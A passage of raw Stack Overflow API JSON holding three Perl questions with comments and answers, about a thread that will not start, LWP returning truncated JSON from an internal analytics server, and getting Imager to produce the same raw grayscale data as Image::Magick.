"accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462908055, "post_id": 37146825, "comment_id": 61832389, "body": "Unfortunately the use of threads is <a href=\"http://perldoc.perl.org/threads.html#WARNING\" rel=\"nofollow noreferrer\">discouraged</a> since Perl 5.20. I like threading in Perl, especially when used together with <code>Threads::Queue</code>. However: Your <code>test</code> function is so small (and quick) that it likely already has returned when you call <code>join()</code> on it. Also you cannot benefit from threads when you start them and then wait for them (with <code>join</code>) to finish."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462908761, "post_id": 37146825, "comment_id": 61832759, "body": "From the code I assume you don&#39;t <code>use strict</code> nor <code>use warnings</code>. Please do so. Did you include <code>use threads;</code>?"}, {"owner": {"reputation": 7, "user_id": 6101273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/565c2352abfb26f6094f552a1e8e535c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonas De Ridder", "link": "https://stackoverflow.com/users/6101273/jonas-de-ridder"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462909503, "post_id": 37146825, "comment_id": 61833178, "body": "Thanks @PerlDog Is there something else encouraged to handle parallel execution in perl? I wrote another script using multithreading in perl 5.22 last week, but it seems repeating is more difficult :) Unfortunately, the structure is completely different, so I can&#39;t copy paste.. The <code>join</code> is indeed misplaced (for debugging purposes). Do you have an idea why the thread won&#39;t start though?"}, {"owner": {"reputation": 7, "user_id": 6101273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/565c2352abfb26f6094f552a1e8e535c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonas De Ridder", "link": "https://stackoverflow.com/users/6101273/jonas-de-ridder"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462909629, "post_id": 37146825, "comment_id": 61833247, "body": "Yes, I do use those :), there&#39;s quite some code above. Also, I don&#39;t get any errors/warnings on execution."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 3, "creation_date": 1462911857, "post_id": 37146825, "comment_id": 61834454, "body": "@Perl Dog, Perl threads work, they are maintained, and they&#39;re not about to be removed.  // They&#39;re supposedly only discouraged if you don&#39;t know how to deal with the threads being heavy. In other words, if you don&#39;t mind the thread taking some time to start up, or if you&#39;re using a worker model, there&#39;s no problems using threads. // Basically, a group got tired of seeing newcomers waste CPU time (in their minds) by using threads or by not reusing them."}, {"owner": {"reputation": 7, "user_id": 6101273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/565c2352abfb26f6094f552a1e8e535c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonas De Ridder", "link": "https://stackoverflow.com/users/6101273/jonas-de-ridder"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462912360, "post_id": 37146825, "comment_id": 61834713, "body": "@ikegami what do you mean with &quot;by not reusing them&quot;?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1462927488, "post_id": 37146825, "comment_id": 61840231, "body": "@Jonas De Ridder, If it&#39;s expensive to start a thread, then having each thread perform more than one work unit will be faster than creating a new thread for each work unit. This is the concept behind worker pools"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462953202, "post_id": 37146825, "comment_id": 61849139, "body": "<a href=\"http://stackoverflow.com/questions/26296206/perl-daemonize-with-child-daemons\" title=\"perl daemonize with child daemons\">stackoverflow.com/questions/26296206/&hellip;</a>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462953324, "post_id": 37146825, "comment_id": 61849214, "body": "It may not start,  because you need an id of 1 for it to do so."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462959932, "post_id": 37146825, "comment_id": 61853565, "body": "@ikegami Great to hear threads are still maintained. :-) I&#39;ve several scripts that start N workers which get their &quot;jobs&quot; fed through a <code>Thread::Queue</code>. It works so smoothly and is so simple that I&#39;d prefer not to replace it with Parallel::Forkmanager. Thanks!"}], "answers": [{"comments": [{"owner": {"reputation": 7, "user_id": 6101273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/565c2352abfb26f6094f552a1e8e535c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonas De Ridder", "link": "https://stackoverflow.com/users/6101273/jonas-de-ridder"}, "edited": false, "score": 0, "creation_date": 1462961298, "post_id": 37157045, "comment_id": 61854574, "body": "Hi @Sobrique , I declare those variables in the code not showed, I&#39;m sure this isn&#39;t the problem as &quot;start&quot; is printed to console (also, I use <code>strict</code> &amp; <code>warnings</code> .and get no error message). Thanks for pointing out the <code>forks</code>, I&#39;ll take a look and if no luck, I&#39;ll create an MCVE &amp; sample input so you can test the thread-code."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 7, "user_id": 6101273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/565c2352abfb26f6094f552a1e8e535c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonas De Ridder", "link": "https://stackoverflow.com/users/6101273/jonas-de-ridder"}, "edited": false, "score": 1, "creation_date": 1462963235, "post_id": 37157045, "comment_id": 61855923, "body": "One obvious alternative - do you have another <code>test</code> within your namespace? What happens if you <code>create(\\&amp;test)</code> instead? Declaring the variables elsewhere isn&#39;t a good practice as a rule - use them within the minimum scope you can, and you&#39;ll avoid &#39;bleed&#39; (e.g. var reuse)."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1462955695, "last_edit_date": 1495540790, "creation_date": 1462955379, "answer_id": 37157045, "question_id": 37146825, "link": "https://stackoverflow.com/questions/37146825/perl-multithreading-thread-doesnt-start/37157045#37157045", "title": "Perl multithreading - thread doesn&#39;t start", "body": "<p>It's hard to say exactly why you're having this problem - the major possiblity seems to be:</p>\n\n<pre><code>    $thread = $request[3];\n    if ($thread == 1){\n</code></pre>\n\n<p>This is input from your filehandle, so a real possiblity is that \"$request[3]\" isn't actually <code>1</code>. </p>\n\n<p>I am a bit suspicious though - your code as <code>use strict;</code> <code>use warnings</code> at the top, but you're not declaring e.g. <code>$thread</code>, <code>$flow</code> etc. with <code>my</code>. That either means you're <em>not</em> using <code>strict</code>, or you're reusing variables - which is a good way to end up with annoying glitches (like this one).</p>\n\n<p>But as it stands - we can't tell you for sure, because we cannot reproduce the problem to test it. In order to do this, we would need some sample input and a <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a></p>\n\n<p>To expand on the point about threads made in the comments - you may see warnings that they are \"Discouraged\". The major reason for this, is because perl threads are not like threads in other languages. They aren't lightweight, where in other languages they are. They're perfectly viable solutions to particular classes of problems - specifically, the ones where you need parallelism with more IPC than a <code>fork</code> based concurrency model would give you.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1463068160, "creation_date": 1463068160, "answer_id": 37191795, "question_id": 37146825, "link": "https://stackoverflow.com/questions/37146825/perl-multithreading-thread-doesnt-start/37191795#37191795", "title": "Perl multithreading - thread doesn&#39;t start", "body": "<p>I suspect you are experiencing <a href=\"https://rt.perl.org/Public/Bug/Display.html?id=31923\" rel=\"nofollow\">this bug</a>, fixed in Perl 5.24.</p>\n\n<p>If so, you could work around it by performing your own decoding rather than using an encoding layer.</p>\n"}], "owner": {"reputation": 7, "user_id": 6101273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/565c2352abfb26f6094f552a1e8e535c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonas De Ridder", "link": "https://stackoverflow.com/users/6101273/jonas-de-ridder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1463068160, "creation_date": 1462906785, "last_edit_date": 1462955096, "question_id": 37146825, "link": "https://stackoverflow.com/questions/37146825/perl-multithreading-thread-doesnt-start", "title": "Perl multithreading - thread doesn&#39;t start", "body": "<p>I need some help, I can't figure out why my thread doesn't want to start. I don't have experience with perl, and was asked to make a script that will process a file row by row. Depending on the row, the process should execute other functions (not in snippet), call the same function on a new file or call the same function on a new file in parallel (thread).</p>\n\n<p>Below, I pasted a snippet of the actual code (removed the non-relevant code).</p>\n\n<p>I'm testing the multithreading part on a function called \"test\" which should print \"ok\". </p>\n\n<p>The process executes correctly, \"start\" is printed, but then it gets stuck and after a brief delay, the process stops executing completely.</p>\n\n<p>A thousand thanks to whoever may help me!</p>\n\n<pre><code>use strict;\nuse warnings;\nuse IO::Prompter;\nuse Getopt::Long;\nuse Log::Message::Simple;\nuse File::Basename;\nuse File::Spec;\nuse IO::Socket::INET;\nuse UUID::Tiny ':std';\nuse threads;\nuse threads::shared;\n\n# *bunch of code deleted*\n\nprocess_file( $cmdline{csvfile}, 1 );\n\nsub test {\n    print \"ok\\n\";\n}\n\nsub process_file {\n\n    # get parameters\n    my ( $input_file, $flowid ) = @_;\n\n    # init variables\n\n    # open input file\n    open( my $fh, '&lt;:encoding(UTF-8)', $input_folder . $input_file )\n        or die \"Could not open file '$input_file' $!\";\n\n    # process file\n    while ( my $row = &lt;$fh&gt; ) {\n        chomp $row;\n        @request   = split \";\", $row;\n        $flow_type = $request[0];\n        $flow      = $request[1];\n\n        # *bunch of code deleted*\n\n        $filename    = \"$flow.csv\";\n        $keep_flowid = $request[2];                       # keep flowid?\n        $tmp_flowid  = $keep_flowid ? $flowid : undef;    # set flowid\n        $thread      = $request[3];\n        if ( $thread == 1 ) {\n            ### Create new thread\n            print \"start\\n\";\n            my $process_thread = threads-&gt;create(\"test\");\n            $process_thread-&gt;join();\n        }\n        elsif ( $thread == 0 ) {\n\n            # wait on process to complete\n            process_file( $filename, $tmp_flowid );\n        }\n\n        # *bunch of code deleted*\n\n    }\n\n    # close file\n    close $fh or die \"Couldn't close inputfile: $input_file\";\n}\n</code></pre>\n"}, {"tags": ["perl", "lwp", "lwp-useragent"], "comments": [{"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 1, "creation_date": 1462903086, "post_id": 37145643, "comment_id": 61829452, "body": "Since there&#39;s no <code>eval</code> and your <code>decode_json</code> didn&#39;t fail, didn&#39;t it actually download correctly and isn&#39;t it just debugging output that is truncated?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462903934, "post_id": 37145643, "comment_id": 61829988, "body": "Unless there&#39;s more to this than you have shown, this is a server bug. Your code using <code>LWP</code> is a little clunky but I can&#39;t see it causing the returned data to be truncated. Try this instead <code>my $ua = LWP::UserAgent-&gt;new;</code> <code>my $res = $ua-&gt;get($trendsurl);</code> <code>print $res-&gt;status_line, &quot;\\n&quot;;</code> <code>my $content = $res-&gt;decoded_content;</code>"}, {"owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "edited": false, "score": 0, "creation_date": 1462906061, "post_id": 37145643, "comment_id": 61831199, "body": "its not truncated by debug .. thats the complete output .. And as far as server bug is concerned, I am able to get the complete data using the browser ... which is a legit json"}, {"owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "edited": false, "score": 0, "creation_date": 1462906626, "post_id": 37145643, "comment_id": 61831531, "body": "Added the eval statement"}, {"owner": {"reputation": 2936, "user_id": 39791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/661c7cc5565e5bc21fb0fc22c0354fef?s=128&d=identicon&r=PG", "display_name": "Joe McMahon", "link": "https://stackoverflow.com/users/39791/joe-mcmahon"}, "edited": false, "score": 1, "creation_date": 1462909266, "post_id": 37145643, "comment_id": 61833026, "body": "What does the Content-Length header say? Does it match the length of the text?"}, {"owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "edited": false, "score": 0, "creation_date": 1462909872, "post_id": 37145643, "comment_id": 61833387, "body": "its 1119 characters ... I just tried another way .. Please check Edit ... It might be a server issue"}], "answers": [{"tags": [], "owner": {"reputation": 175, "user_id": 6281292, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yWEaV.jpg?s=128&g=1", "display_name": "Jose Bernalte", "link": "https://stackoverflow.com/users/6281292/jose-bernalte"}, "is_accepted": false, "score": -2, "last_activity_date": 1462903565, "creation_date": 1462903565, "answer_id": 37145905, "question_id": 37145643, "link": "https://stackoverflow.com/questions/37145643/lwpsimple-lwpuseragent-doesnt-return-the-complete-webpage-content/37145905#37145905", "title": "LWP::Simple &amp; LWP::UserAgent doesn&#39;t return the complete webpage content", "body": "<p>I use this code or something like that, this code use POST for params, i get a large JSON with this and its works well</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use LWP::UserAgent;\nuse Data::Dumper;\nuse JSON;\nuse JSON::Parse;\n\nmy $params = \n{(\n'flat' =&gt; 1,\n)};\n\n    my $server_endpoint = \"http://1.2.3.4:8081/analytics/mydata/myNodeData\";\n    my $ua = LWP::UserAgent-&gt;new;\n    my $req = HTTP::Request-&gt;new();\n    my $response = $ua-&gt;post( $server_endpoint, $params );\n    my $result  = $response-&gt;decoded_content();\n\n    $result = from_json($result);\n    print Dumper $result;\n</code></pre>\n"}], "owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1103, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1462910057, "creation_date": 1462902633, "last_edit_date": 1462910057, "question_id": 37145643, "link": "https://stackoverflow.com/questions/37145643/lwpsimple-lwpuseragent-doesnt-return-the-complete-webpage-content", "title": "LWP::Simple &amp; LWP::UserAgent doesn&#39;t return the complete webpage content", "body": "<p>I have an internal local machine, hosting analytics which I need to process. The analytics are returned in JSON format if you have the URL. for instance, </p>\n\n<pre><code>http://1.2.3.4:8081/analytics/mydata/myNodeData?flat\n</code></pre>\n\n<p>it would give the JSON file. Now I am getting the JSON file via LWP::Simple (also tried LWP::UserAgent) into a variable, and later parsing it. It works fine for most of my URLs. The problem is that with some of the URLs, it doesn't read the whole data into my variable, but only partial.</p>\n\n<pre><code>use LWP::Simple;                # From CPAN\nuse LWP::UserAgent;\nuse JSON qw( decode_json );     # From CPAN\nuse Data::Dumper;               # Perl core module\nuse Data::Diver qw{ Dive };         # for diving in the Hash\nuse strict;                     # Good practice\nuse warnings;                   # Good practice\n\n#using LWP Simple    \nmy $trendsurl = 'http://1.2.3.4:8081/analytics/mydata/myNodeData?flat';\nmy $json = get( $trendsurl );\ndie \"Could not get $trendsurl!\" unless defined $json;\nmy $decoded_json = decode_json( $json );\n\n#using LWP::UserAgent\nmy $ua = LWP::UserAgent-&gt;new();\nmy $req = new HTTP::Request GET =&gt; $trendsurl;\nmy $res = $ua-&gt;request($req);\nmy $content = $res-&gt;content;\n</code></pre>\n\n<p>In case its helpful here is the display of debug info of content (the decoded_json) is the same. </p>\n\n<pre><code>  DB&lt;1&gt; p $content\n{\"NodeStatus\": {\"deleted\": false, \"disk_usage_info\": [{\"partition_space_availabl\ne_1k\": 791475728, \"partition_space_used_1k\": 171611096, \"partition_name\": \"/dev/\nmapper/os-root\", \"partition_type\": \"ext4\"}, {\"partition_space_available_1k\": 151\n200, \"partition_space_used_1k\": 39244, \"partition_name\": \"/dev/vda3\", \"partition\n_type\": \"ext2\"}], \"process_info\": [{\"process_name\": \"XX-api:0\", \"process_s\ntate\": \"PROCESS_STATE_RUNNING\", \"last_stop_time\": null, \"start_count\": 2, \"core_\nfile_list\": [], \"last_start_time\": \"1461822985334246\", \"stop_count\": 0, \"last_ex\nit_time\": null, \"exit_count\": 0}, {\"process_name\": \"XX-config-nodemgr\", \"p\nrocess_state\": \"PROCESS_STATE_RUNNING\", \"last_stop_time\": null, \"start_count\": 2\n, \"core_file_list\": [], \"last_start_time\": \"1461822979324868\", \"stop_count\": 0,\n\"last_exit_time\": null, \"exit_count\": 0}, {\"process_name\": \"XX-discovery:0\n\", \"process_state\": \"PROCESS_STATE_RUNNING\", \"last_stop_time\": null, \"start_coun\nt\": 2, \"core_file_list\": [], \"last_start_time\": \"1461822983332516\", \"stop_count\"\n: 0, \"last_exit_time\": null, \"exit_count\": 0}, {\"process_name\": \"XX-svc-m\n\n  DB&lt;2&gt;\n</code></pre>\n\n<p>You see the log file is abruptly terminated .. If I get this via my browser,its complete ..    </p>\n\n<p>EDIT:</p>\n\n<p>I added the following eval statement while fetching URL and then decoding JSON .. the retreival is without error but JSON decoding fails because its not a complete JSON.</p>\n\n<pre><code>eval { $decoded_json = parse_json( $json ) };\nif ($@) {\n    warn \"func raised an exception: $@\";\n}\nfunc raised an exception: JSON error at line 1: Unexpected end of input parsing \nstring starting from byte 1105 at Tester.pl line 28.\n</code></pre>\n\n<p>EDIT 2: \nI just tried another way ... </p>\n\n<pre><code>#!/usr/bin/perl  \n\n use LWP::UserAgent;  \n use HTTP::Request;  \n\n my $URL = 'http://1.2.3.4:8081/analytics/mydata/myNodeData?flat';  \n\n my $ua = LWP::UserAgent-&gt;new();  \n my $header = HTTP::Request-&gt;new(GET =&gt; $URL);  \n my $request = HTTP::Request-&gt;new('GET', $URL, $header);  \n my $response = $ua-&gt;request($request);  \n\n if ($response-&gt;is_success){  \n     print \"URL:$URL\\nHeaders:\\n\";  \n     print $response-&gt;headers_as_string;  \n }elsif ($response-&gt;is_error){  \n     print \"Error:$URL\\n\";  \n     print $response-&gt;error_as_HTML;  \n } \n</code></pre>\n\n<p>and the debug shows that $response->is_success block is selected and here is the output.</p>\n\n<pre><code>URL:http://1.2.3.4:8081/analytics/mydata/myNodeData?flat\nHeaders:\nConnection: close\nDate: Tue, 10 May 2016 19:49:40 GMT\nContent-Type: application/json\nClient-Aborted: die\nClient-Date: Tue, 10 May 2016 19:49:38 GMT\nClient-Peer: 1.2.3.4:8081\nClient-Response-Num: 1\nClient-Transfer-Encoding: chunked\nX-Died: read failed: An existing connection was forcibly closed by the remote ho\nst. at C:/Perl64/lib/LWP/Protocol/http.pm line 465.\n</code></pre>\n"}, {"tags": ["image", "perl"], "comments": [{"owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1462902200, "post_id": 37144970, "comment_id": 61828931, "body": "It looks like <code>Imager</code> uses different grayscale weighting coefficients (0.22,0.707,0.071) from <code>IM</code>. <code>IM&#39;s</code> &quot;709RecLuma&quot; looks closer but not identical. Do you need it absolutely accurate?"}, {"owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1462902597, "post_id": 37144970, "comment_id": 61829152, "body": "The colormatrix looks like the way to go... but I&#39;m only on a mobile at the moment."}], "answers": [{"comments": [{"owner": {"reputation": 52821, "user_id": 632407, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/AfGWW.jpg?s=128&g=1", "display_name": "jm666", "link": "https://stackoverflow.com/users/632407/jm666"}, "edited": false, "score": 0, "creation_date": 1462909792, "post_id": 37146934, "comment_id": 61833342, "body": "Yes, the numbers looks OK, but the size of the <code>magick.raw</code> is only 529 bytes and the <code>imager.raw</code> is more the 3174 bytes. I added more information to the question for why a need the conversion."}, {"owner": {"reputation": 52821, "user_id": 632407, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/AfGWW.jpg?s=128&g=1", "display_name": "jm666", "link": "https://stackoverflow.com/users/632407/jm666"}, "edited": false, "score": 0, "creation_date": 1462920456, "post_id": 37146934, "comment_id": 61838249, "body": "Ahhhh.. Finally got the solution. Imager opened the above png image in 16bit/channel. So to get the 8 bit, needed to use <code>my $img8 = $img-&gt;to_rgb8;</code> and after i used the your <code>my $gray = $img8-&gt;convert(matrix =&gt; [[1,0,0]]);</code> . Accepting, because you helped me."}, {"owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "reply_to_user": {"reputation": 52821, "user_id": 632407, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/AfGWW.jpg?s=128&g=1", "display_name": "jm666", "link": "https://stackoverflow.com/users/632407/jm666"}, "edited": false, "score": 0, "creation_date": 1462989612, "post_id": 37146934, "comment_id": 61875070, "body": "@jm666 That&#39;s very generous - thank you. But it&#39;s fine if you want to put the full, correct solution as an answer for posterity and mark it right for all to see. Good luck with your project."}], "tags": [], "owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "is_accepted": true, "score": 2, "last_activity_date": 1462916613, "last_edit_date": 1462916613, "creation_date": 1462907136, "answer_id": 37146934, "question_id": 37144970, "link": "https://stackoverflow.com/questions/37144970/how-to-get-the-imagemagicks-blob-raw-image-from-the-imager/37146934#37146934", "title": "How to get the Image::Magick&#39;s blob (raw) image from the Imager?", "body": "<p>I have had a little time to test this out and there is something odd going on. I created a dummy <code>qrcode.pnm</code> with ImageMagick:</p>\n\n<pre><code>convert -size 1x1! -depth 8 -compress none xc:black xc:white xc:gray xc:gray30 xc:gray90 +append qrcode.pnm\n</code></pre>\n\n<p>And with that, the following code works as expected:</p>\n\n<pre><code>#!/usr/bin/perl\nuse 5.014;\nuse warnings;\nuse Image::Magick;\nuse Imager;\n\nmy $file = shift // 'qrcode.pnm';\ndie \"missing $file\" unless -f $file;\n\n#Image::Magick\nmy $im = Image::Magick-&gt;new;\n$im-&gt;Read($file);\nmy $raw_magic = $im-&gt;ImageToBlob(magick =&gt; 'GRAY', depth =&gt; 8);\nhexdump($raw_magic);\n\n#Imager\nmy $img = Imager-&gt;new;\n$img-&gt;read(file=&gt;$file,type=&gt;'pnm') or die 'read:', $img-&gt;errstr;\nmy $gray = $img-&gt;convert(matrix =&gt; [[1,0,0]]);\n$gray-&gt;write(data =&gt; \\my $raw_imager, type =&gt; 'raw') or die 'write:', $gray-&gt;errstr;\nhexdump($raw_imager);\n\nsay \"Different\" if $raw_magic cmp $raw_imager;\n\nsub hexdump {\n    my $data = shift;\n    my $n;\n    print $_, (++$n % 16) ? \" \" : \"\\n\"\n        for unpack '(A2)*', unpack 'H*', $data;\n    print \"\\n\";\n}\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>00 ff 7e 4d e5\n00 ff 7e 4d e5\n</code></pre>\n\n<p>Not sure what that proves, or if it is useful but will spend some more time tomorrow.</p>\n"}], "owner": {"reputation": 52821, "user_id": 632407, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/AfGWW.jpg?s=128&g=1", "display_name": "jm666", "link": "https://stackoverflow.com/users/632407/jm666"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 383, "favorite_count": 0, "accepted_answer_id": 37146934, "answer_count": 1, "score": 1, "last_activity_date": 1462916613, "creation_date": 1462900514, "last_edit_date": 1462909469, "question_id": 37144970, "link": "https://stackoverflow.com/questions/37144970/how-to-get-the-imagemagicks-blob-raw-image-from-the-imager", "title": "How to get the Image::Magick&#39;s blob (raw) image from the Imager?", "body": "<p>How to get the same <code>raw data</code> from the <a href=\"https://metacpan.org/pod/Imager\" rel=\"nofollow noreferrer\">Imager</a> as from the  <a href=\"https://metacpan.org/pod/Image::Magick\" rel=\"nofollow noreferrer\">Image::Magick</a>'s <code>ImageToBlob</code> function for the <code>GRAY/8bit</code>? </p>\n\n<pre><code>#Image::Magick\nmy $raw_magic = $im-&gt;ImageToBlob(magick =&gt; 'GRAY', depth =&gt; 8);\n\n#Imager???  the simple 'gray' preset gives different data\nmy $gray = $img-&gt;convert(preset =&gt; 'gray');\n$gray-&gt;write(data =&gt; \\my $raw_imager, type =&gt; 'raw');\n</code></pre>\n\n<p>Probably the <code>convert</code> using the <code>matrix =&gt; ...</code> could help, but can't figure how to use it..</p>\n\n<p>(I need pass the raw data to some another module, which works OK with the <code>$raw_magic</code> - so, looking for how to get the same data from the <code>Imager</code> .)</p>\n\n<p>If someone want play, here is my test image <code>qrcode.png</code> \n<a href=\"https://i.stack.imgur.com/RIKG8.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/RIKG8.png\" alt=\"enter image description here\"></a>\nand also my test script.</p>\n\n<pre><code>use 5.014;\nuse warnings;\nuse Image::Magick;\nuse Imager;\n\nmy $file = shift // 'qrcode.png';\ndie \"missing $file\" unless -f $file;\n\n#Image::Magick\nmy $im = Image::Magick-&gt;new;\n$im-&gt;Read($file);\nmy $raw_magic = $im-&gt;ImageToBlob(magick =&gt; 'GRAY', depth =&gt; 8);\n#hexdump($raw_magic);\n\n#Imager\nmy $img = 